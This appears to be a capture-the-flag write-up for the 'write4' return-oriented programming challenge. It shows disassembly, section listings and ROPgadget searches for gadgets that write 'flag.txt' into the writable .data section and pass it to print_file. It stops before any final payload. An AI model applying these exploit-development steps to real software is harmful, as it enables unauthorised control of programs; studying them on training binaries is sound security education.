we need to write data into memory

it has a print_file function that will print the content of a file

using `gdb-gef` to disassemble the function `print_file`

```bash
gef➤  disas usefulFunction
Dump of assembler code for function usefulFunction:
   0x0000000000400617 <+0>:     push   rbp
   0x0000000000400618 <+1>:     mov    rbp,rsp
   0x000000000040061b <+4>:     mov    edi,0x4006b4
   0x0000000000400620 <+9>:     call   0x400510 <print_file@plt>
   0x0000000000400625 <+14>:    nop
   0x0000000000400626 <+15>:    pop    rbp
   0x0000000000400627 <+16>:    ret
End of assembler dump.
gef➤  x/s 0x4006b4
0x4006b4:       "nonexistent"
```

We have our function at `0x400617` and the string at `0x4006b4`

```bash
└─$ rabin2 -S write4
[Sections]

nth paddr        size vaddr       vsize perm type        name
―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
0   0x00000000    0x0 0x00000000    0x0 ---- NULL
1   0x00000238   0x1c 0x00400238   0x1c -r-- PROGBITS    .interp
2   0x00000254   0x20 0x00400254   0x20 -r-- NOTE        .note.ABI-tag
3   0x00000274   0x24 0x00400274   0x24 -r-- NOTE        .note.gnu.build-id
4   0x00000298   0x38 0x00400298   0x38 -r-- GNU_HASH    .gnu.hash
5   0x000002d0   0xf0 0x004002d0   0xf0 -r-- DYNSYM      .dynsym
6   0x000003c0   0x7c 0x004003c0   0x7c -r-- STRTAB      .dynstr
7   0x0000043c   0x14 0x0040043c   0x14 -r-- GNU_VERSYM  .gnu.version
8   0x00000450   0x20 0x00400450   0x20 -r-- GNU_VERNEED .gnu.version_r
9   0x00000470   0x30 0x00400470   0x30 -r-- RELA        .rela.dyn
10  0x000004a0   0x30 0x004004a0   0x30 -r-- RELA        .rela.plt
11  0x000004d0   0x17 0x004004d0   0x17 -r-x PROGBITS    .init
12  0x000004f0   0x30 0x004004f0   0x30 -r-x PROGBITS    .plt
13  0x00000520  0x182 0x00400520  0x182 -r-x PROGBITS    .text
14  0x000006a4    0x9 0x004006a4    0x9 -r-x PROGBITS    .fini
15  0x000006b0   0x10 0x004006b0   0x10 -r-- PROGBITS    .rodata
16  0x000006c0   0x44 0x004006c0   0x44 -r-- PROGBITS    .eh_frame_hdr
17  0x00000708  0x120 0x00400708  0x120 -r-- PROGBITS    .eh_frame
18  0x00000df0    0x8 0x00600df0    0x8 -rw- INIT_ARRAY  .init_array
19  0x00000df8    0x8 0x00600df8    0x8 -rw- FINI_ARRAY  .fini_array
20  0x00000e00  0x1f0 0x00600e00  0x1f0 -rw- DYNAMIC     .dynamic
21  0x00000ff0   0x10 0x00600ff0   0x10 -rw- PROGBITS    .got
22  0x00001000   0x28 0x00601000   0x28 -rw- PROGBITS    .got.plt
23  0x00001028   0x10 0x00601028   0x10 -rw- PROGBITS    .data
24  0x00001038    0x0 0x00601038    0x8 -rw- NOBITS      .bss
25  0x00001038   0x29 0x00000000   0x29 ---- PROGBITS    .comment
26  0x00001068  0x618 0x00000000  0x618 ---- SYMTAB      .symtab
27  0x00001680  0x1f6 0x00000000  0x1f6 ---- STRTAB      .strtab
28  0x00001876  0x103 0x00000000  0x103 ---- STRTAB      .shstrtab
```

`.data` segment is writeable

using `r2` find our useful mov gadget at `0x00400628`

```bash
[0x00400520]> pd 2 @loc.usefulGadgets
            ;-- usefulGadgets:
            0x00400628      4d893e         mov qword [r14], r15
            0x0040062b      c3             ret
```

We need to put accurate value in r14 and r15

find rop gadet to do that

```bash
└─$ ROPgadget --binary write4 | grep "pop r15"
0x000000000040068c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000400690 : pop r14 ; pop r15 ; ret
0x0000000000400692 : pop r15 ; ret
0x000000000040068b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040068f : pop rbp ; pop r14 ; pop r15 ; ret
0x0000000000400691 : pop rsi ; pop r15 ; ret
0x000000000040068d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
```

we have our useful rop gadget at `0x0000000000400690`

`0x0000000000400690 : pop r14 ; pop r15 ; ret`

as from disassembly of usefulFunction we know that we have to put the value of "flag.txt" in `edi` register, in order to get its content printed. `edi` register is 32-bit register of `rdi` register, 
so we need to find a rop gadget that will pop the value into `rdi` register

```bash
└─$ ROPgadget --binary write4 | grep "pop rdi"
0x0000000000400693 : pop rdi ; ret
```

required rop gadet is at `0x0000000000400693`

